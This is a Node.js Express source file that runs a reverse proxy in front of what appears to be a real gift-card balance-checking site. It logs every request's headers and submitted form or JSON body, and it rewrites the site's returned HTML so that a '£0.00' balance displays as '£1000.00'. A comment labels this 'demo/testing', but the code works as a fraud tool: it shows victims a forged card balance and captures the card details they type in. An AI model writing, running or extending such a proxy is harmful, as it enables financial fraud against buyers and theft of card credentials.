// ...existing code...
// Place this at the end of the file, after all other app.use and routes:
const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const zlib = require('zlib');
const qs = require('querystring');
const app = express();

// Parse URL-encoded and JSON bodies for all requests
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Set Content-Security-Policy header for all requests
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",
      "img-src 'self' data:",
      "style-src 'self' 'unsafe-inline' https://netdna.bootstrapcdn.com https://use.fontawesome.com",
      "script-src 'self' 'unsafe-inline' https://www.google.com https://www.gstatic.com",
      "connect-src 'self' http://localhost:8080",
      "frame-src https://www.google.com", // for reCAPTCHA
    ].join('; ')
  );
  next();
});

// Log every request
app.use((req, _res, next) => {
  console.log('\n--- Request ---');
  console.log(req.method, req.originalUrl);
  console.log('Headers:', req.headers);
  console.log('Query:', req.query);
  console.log('Body:', req.body);
  next();
});

// Proxy all requests to the target server
const TARGET = process.env.TARGET || 'https://tsuk.claim.cards';
console.log('Proxy target:', TARGET);
// Proxy only /cardInfo

app.use('/cardInfo', createProxyMiddleware({
  target: TARGET,
  changeOrigin: true,
  selfHandleResponse: true,
  onProxyReq: (proxyReq, req, res) => {
    // Re-stream body if it was parsed by express
    if (!req.body || !Object.keys(req.body).length || req.method === 'GET' || req.method === 'HEAD') return;
    const contentType = proxyReq.getHeader('content-type') || '';
    let bodyData;
    if (contentType.includes('application/json')) {
      bodyData = JSON.stringify(req.body);
    } else if (contentType.includes('application/x-www-form-urlencoded')) {
      bodyData = qs.stringify(req.body);
    }
    if (bodyData) {
      proxyReq.setHeader('content-length', Buffer.byteLength(bodyData));
      proxyReq.write(bodyData);
      proxyReq.end();
    }
  },
  onProxyRes: (proxyRes, req, res) => {
    console.log('onProxyRes status', proxyRes.statusCode, 'url', req.originalUrl, 'content-type', proxyRes.headers['content-type']);
    const contentType = String(proxyRes.headers['content-type'] || '');
    const isHtml = contentType.includes('text/html');
    const shouldModify = isHtml && req.originalUrl.startsWith('/cardInfo');

    if (!shouldModify) {
      // Pipe through untouched for non-HTML or other routes
      res.writeHead(proxyRes.statusCode, proxyRes.headers);
      proxyRes.on('data', chunk => res.write(chunk));
      proxyRes.on('end', () => { res.end(); });
      return;
    }

    const encoding = String(proxyRes.headers['content-encoding'] || '').toLowerCase();
    let chunks = [];
  proxyRes.on('data', chunk => { chunks.push(chunk); });
    proxyRes.on('end', () => {
      try {
        let buffer = Buffer.concat(chunks);
        // Decode if compressed
        if (encoding === 'gzip') buffer = zlib.gunzipSync(buffer);
        else if (encoding === 'deflate') buffer = zlib.inflateSync(buffer);
        else if (encoding === 'br') buffer = zlib.brotliDecompressSync(buffer);

        let html = buffer.toString('utf8');
        // Simple deterministic rewrites for demo/testing
        const originalCall = "formatCurrency('GBP', '£', '0.00', '{2}{3}')";
        const rewrittenCall = "formatCurrency('GBP', '£', '1000.00', '{2}{3}')";
        if (html.includes(originalCall)) {
          html = html.replace(new RegExp(originalCall, 'g'), rewrittenCall);
        }
        // Also update any literal balance spans £0.00 -> £1000.00
        html = html.replace(/£0\.00/g, '£1000.00');

        // Send modified HTML uncompressed
        const headers = { ...proxyRes.headers };
        delete headers['content-encoding'];
        delete headers['content-length'];
        headers['content-type'] = 'text/html; charset=utf-8';
        res.writeHead(proxyRes.statusCode, headers);
        res.end(html);
      } catch (e) {
        console.error('Rewrite error', e);
        // Fallback: pipe original if something goes wrong
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res);
      }
    });
  }
}));

// Simple health endpoint
app.get('/healthz', (_req, res) => res.json({ ok: true, target: TARGET }));

app.listen(8080, () => console.log('Proxy server listening on http://localhost:8080'));
